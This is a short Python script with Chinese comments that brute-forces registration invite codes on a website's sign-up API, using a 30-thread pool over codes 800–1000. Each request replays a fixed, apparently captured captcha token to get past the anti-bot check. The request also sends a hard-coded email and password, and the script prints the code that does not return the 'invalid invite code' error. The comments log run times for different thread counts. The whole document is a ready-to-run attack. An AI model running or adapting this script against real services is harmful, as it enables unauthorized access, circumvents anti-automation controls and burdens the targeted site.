# coding:utf-8
# !/usr/bin/env python2
# python2.python3 通用
import requests
from concurrent.futures import ThreadPoolExecutor
import datetime


def tq(code):
    data = {
        'email': '113811112202@qq.com'
        , 'name': 'co2222ee',
        'password': 'qwerzxcv',
        'passwordagain': 'qwerzxcv',
        'inviteCode': '%s' % str(code),  # (unable to decode value)
        'geetest_challenge': 'ec4384831c8cc9d799b297b49e57f72564',
        'geetest_validate': '3189a9537d4c93811389bdcb75e1811a',
        'geetest_seccode': '3189a9537d4c93811389bdcb75e1811a|jordan'

    }
    resp = requests.post('https://bithack.io/api?userReg', data)
    if not resp.text == '邀请码错误':
        print('正确邀请码为:{}'.format(code))
    else:
        print(code)


if __name__ == '__main__':
    start = datetime.datetime.now()
    # print (start)
    tasks = range(800, 1001)
    with ThreadPoolExecutor(max_workers=30) as pool:
        pool.map(tq, tasks)
    end = datetime.datetime.now()
    print(end - start)
    # max_workers=4,1min
    # max_workers=8,41s
    # max_workers=10,38s
    # max_workers=20,37s
    # max_workers=30,35s
    # max_workers=200,35s

    '''
    多参数线程池
    pool = ThreadPoolExecutor(max_workers=2)
    for item in range(2,1001):
        f = pool.submit(tq, 1, item)
    '''
